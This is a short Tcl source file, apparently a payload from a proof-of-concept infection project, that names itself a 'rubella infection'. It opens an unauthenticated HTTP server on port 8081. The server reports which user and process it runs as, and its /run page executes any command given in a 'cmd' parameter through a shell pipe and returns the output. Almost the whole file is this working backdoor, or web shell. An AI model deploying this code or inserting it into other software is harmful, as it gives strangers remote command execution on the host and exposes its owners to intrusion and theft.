# Copyright (c) 2009 Will Drewry <redpig@dataspill.org>. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file or at http://github.org/redpig/patient0.
proc unescape {str} { return [regsub -all {%22} [regsub -all {%20} $str " "] "\""]; }; proc send {sock msg} { puts -nonewline $sock $msg }; proc send_ok {sock body} { send $sock "HTTP/1.0 200 OK\r\n"; send $sock "Content-Type: text/html; charset=ISO-8859-1\n"; send $sock "Connection: Close\n"; send $sock "Content-Length: [string length $body]\n\n"; send $sock $body; }; proc handle_index {sock} { set body "<html><head><title>rubella</title></head><body><h3>rubella infection running as [exec whoami] in pid [pid]</h3><a href=\"/run\">run something</a></body></html>"; send_ok $sock $body; }; proc run_command {cmd} { if {[catch {set fl [open "| $cmd"]} err]} { return ": bad command ($cmd)"; }; set data [read $fl]; if {[catch {close $fl} err]} { puts "$cmd command failed: $err"; }; return [regsub -all {\n} $data "<br/>"]; }; proc handle_run {sock req} { if {[regexp {cmd=([^ ]*)} $req full cmd]} { send_ok $sock [run_command [unescape $cmd]]; } else { send_ok $sock "<html><head><title>rubella infection: run</title></head><body><form>cmd: <input name=cmd value='' type=text /><input type=submit /></form></body></html>"; }; }; proc parse_request {sock} { set req [gets $sock]; while {1} { if {[eof $sock]} { close $sock; break; }; set header [gets $sock]; if {[string length $header] == 0} { break; }; }; if {[eof $sock]} { close $sock; } else { if {[regexp {^GET / } $req]} { handle_index $sock; } elseif {[regexp {^GET /run} $req]} { handle_run $sock $req; } else { send $sock "HTTP/1.0 403 FORBIDDEN\r\n\r\n"; }; }; close $sock; }; proc accept {sock addr port} { fileevent $sock readable [list parse_request $sock]; fconfigure $sock -buffering line -blocking 1; }; socket -server accept 8081; vwait events;
